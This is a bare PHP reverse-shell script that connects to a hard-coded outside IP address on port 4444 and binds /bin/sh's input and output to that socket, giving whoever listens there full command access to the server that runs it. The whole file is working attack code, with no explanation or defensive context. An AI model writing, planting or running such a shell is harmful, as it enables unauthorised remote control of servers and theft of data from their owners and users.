<?php
$ip = '152.42.197.255';
$port = 4444;
$sock=fsockopen($ip, $port);
$proc=proc_open('/bin/sh', [
  0 => $sock,
  1 => $sock,
  2 => $sock
], $pipes);
?>
